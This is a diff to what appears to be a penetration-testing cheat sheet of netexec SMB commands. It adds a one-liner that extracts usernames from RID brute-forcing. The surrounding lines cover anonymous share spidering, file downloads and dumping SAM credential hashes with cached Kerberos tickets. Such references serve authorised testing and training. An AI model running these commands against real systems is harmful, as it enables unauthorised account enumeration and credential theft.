@@ -641,6 +641,7 @@ $ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=true 
 $ netexec smb <RHOST> -u '' -p '' --share <SHARE> --get-file <FILE> <FILE> 
 $ netexec smb <RHOST> -u 'guest' -p '' --shares --rid-brute
 $ netexec smb <RHOST> -u 'guest' -p '' --shares --rid-brute 100000
+$ netexec smb <RHOST> -u 'guest' -p '' --shares --rid-brute | grep 'SidTypeUser' | awk '{print $6}' 
 $ netexec smb <RHOST> -u '<USERNAME>' --use-kcache --users
 $ netexec smb <RHOST> -u '<USERNAME>' --use-kcache --sam
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares
